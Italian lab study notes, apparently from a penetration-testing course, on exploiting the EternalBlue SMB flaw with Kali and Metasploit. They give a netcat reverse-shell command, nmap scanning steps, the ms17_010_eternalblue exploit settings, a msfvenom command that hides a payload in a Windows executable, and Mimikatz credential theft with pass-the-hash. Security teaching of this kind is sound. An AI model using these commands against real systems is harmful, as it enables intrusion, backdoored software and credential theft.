vedremo la vunlerabilità "Eternal Blue" dovuta a SMBA di windows: sulla macchina Windows usiamo la modalità NAT così da creare IP al di fuori degli IP del PC e useremo MetaSploit.
Uso ovviamente anche Kali mettendolo in ascolto sulla porta 8888 (nc -lvp 8888), e poi sul pc hosto uso netcat facendo (nc -e /bin/ Indirizzo_Ip 8888), e facendo così praticamente
mando la shell su quell'IP sulla porta 8888 così da controllare quella cartella del pc: praticamente sto controllando la caretlla della shell di un pc dalla macchina virtuale kali
Così poi kali ha gli stessi permessi che usavo nella shell del pc, e ciò mi permette di cerare malware inserendo magari quel comando in un file malevolo: questo "attacco" si chiama
REVERSE SHELL, che in realtà è tutto valido, e ci sono diversi modi per farlo.
Una volta usata la reverse shell, io potrei voler copiare i file ma potrei perdere tempo, quindi lo vorrei fare in automatico con dei tool. (posso registrare lo schermo con asciinema rec)
La prima cosa da fare è (sudo mfdb start) per avviare il database, e poi (msfconsole) per avviare MetaSploit. Devo poi fare scanning ed enumeration usando (db_nmap Inidirizzi_Ip)
che un wrapper di nmap: praticamente fa nmpa e salva i risultati sul database avviato prima, e poi con (host) vedo le info relativi a quelli Ip salvati nel db.
Con (db_nmap Indirizzo_Ip -Pn -A) posso fare scanning aggressivo sulle porte scoperte dell'host (-A) così da vedere anche le varie vulnerabilità dei servizi attivi su quelle porte, e 
dico anche di fare lo scanning lo stesso anche se l'host non mi risponde (-Pn). La porta che ci interessa è la 445, dove si trova la cartella condivisa (quella vunerabile al null 
session attack), che potrebbe non essere condivisa e nel caso la devo condividere io disabilitando il firewall di windows.
Con lo script (smb-vuln-ms17-010) vedo se la porta smba è vulnerabile: se trovo per esempio RCE significa che quella porta è vulnerabile all'esecuzione di codice remoto, e poi
con (search eternalblue) vedo se è vulnerabile è Eternal Blue. Posso quindi sfruttare quella vulnerabilità con (use exploit\smb\ms17_010_eternalblue), e per sfruttarla poi
devo definire un payload di attacco, facendolo con (set RHOSTS Indirizzo_Ip) (lo vedo con show option se c'è).
Faccio poi (set LHOST Indirizzo_Ip) per mandargli una reverse shell, e poi sono protno per attaccare. Il payload di attacco lo posso creare con (msfvenom -a Architettura --platform
Piattaforma -x Software_modificato_che_mi_da_il_controllo -p Caretlla_in_cui_si_trova_eseguibile_da_attaccare lhost Indirizzo_Ip -f exe -o Eseguibile_da_attaccare): inietta il malware
in quell'exe che sta in quella cartella di quella piattaforma (tipo windows) con quella architettura (tipo x64 per 64 bit).
Così quando poi il pc avvia quell'eseguibile (nell'esempio la calcolatrice), do l'accesso al pc alla macchina virtuale kali.
Questo Software_modificato_che_mi_da_il_controllo lo ottengo prendendo l'eseguibile da attaccare nella macchina windows, lo analizzo con (file Eseguibile_da_attacare) e poi sempre cn 
msfvenom lo creo.
Una volta avuto l'accesso a windows, con (meterpreter) posso fare delle cose come avviare la webcam, avere informazione sul sistema ecc..
Ipayload di meterpeter sono di diversi, ma principalmente di 2 tipi:
-bind: apre una porta verso l'host attaccato, così mi ci connetto
-reverse: è l'host attaccato che si connette a me
I più semplici da usare sono i tcp, con l'estensione rc4 per cofrare, o http per usare anche un certificato oltre alla cifratura.

hashcat è un programma che usa la scheda video per fare calcoli complessi.

kiwi/Mimikatz può estrarre dalla memoria password in chiaro, funzioni crittografiche hash, codice PIN e ticket Kerberos. Può anche eseguire pass-the-hash, pass-the-ticket, creare 
biglietti vincenti, lavorare su certificati o chiavi private e protette. Tali credenziali ottenute possono essere in seguito utilizzate per eseguire movimenti laterali e accedere 
a informazioni riservate. La maggior parte del software AntiVirus rileva i binari Mimikatz predefiniti.